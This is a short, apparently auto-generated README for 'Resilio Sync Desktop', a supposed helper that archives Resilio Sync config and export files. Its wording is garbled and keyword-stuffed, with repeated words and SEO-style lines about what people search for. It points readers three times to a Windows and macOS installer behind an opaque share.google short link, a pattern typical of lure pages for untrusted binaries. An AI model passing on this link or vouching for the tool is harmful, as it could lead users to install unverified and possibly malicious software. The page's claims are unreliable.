![Resilio Sync Desktop](assets/hero.png)

# Resilio Sync Desktop

*Dated copies of Resilio Sync data data, nothing uploaded.*

## What Resilio Sync Desktop is

**Resilio Sync Desktop** is a desktop helper. A desktop helper that finds Resilio Sync data directories and archives config and export files locally.

Resilio Sync drops data files next to launcher caches.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Finds the Resilio Sync data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Resilio Sync desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/nancygreen-37/resilio-sync-desktop

MIT license. See `LICENSE`.
